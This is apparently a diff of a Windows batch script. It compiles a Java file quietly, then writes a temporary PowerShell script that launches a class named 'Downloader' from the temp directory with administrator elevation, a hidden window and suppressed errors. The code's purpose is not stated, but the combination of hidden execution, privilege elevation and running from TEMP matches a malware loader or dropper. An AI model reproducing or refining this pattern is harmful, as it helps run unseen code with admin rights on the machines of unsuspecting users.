@@ -102,20 +102,17 @@ if not defined JAVAW_PATH (
     exit
 )
 
-:: Create PowerShell script that compiles and runs the Java file
+:: Compile the Java file first (without admin)
+set "JAVAC_PATH=%JAVAW_PATH:javaw.exe=javac.exe%"
+"%JAVAC_PATH%" "%JAVA_FILE%" 2>nul
+
+:: Create PowerShell script to run compiled class with admin
 set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
 (
 echo $javaPath = '%JAVAW_PATH%'
-echo $javaFile = '%JAVA_FILE%'
-echo $javacPath = $javaPath -replace 'javaw.exe','javac.exe'
-echo $classFile = $javaFile -replace '.java','.class'
-echo $tempDir = [System.IO.Path]::GetTempPath^(^)
+echo $tempDir = '%TEMP%'
 echo try {
-echo     # Compile the Java file
-echo     $compileProcess = Start-Process -FilePath $javacPath -ArgumentList $javaFile -Wait -NoNewWindow -PassThru -WindowStyle Hidden
-echo     if ^($compileProcess.ExitCode -ne 0^) { exit 1 }
-echo     # Run the compiled class with admin
-echo     Start-Process -FilePath $javaPath -ArgumentList @^('-cp', $tempDir, 'Downloader'^) -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
+echo     Start-Process -FilePath $javaPath -ArgumentList '-cp',$tempDir,'Downloader' -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
 echo     exit 0
 echo } catch {
 echo     exit 1
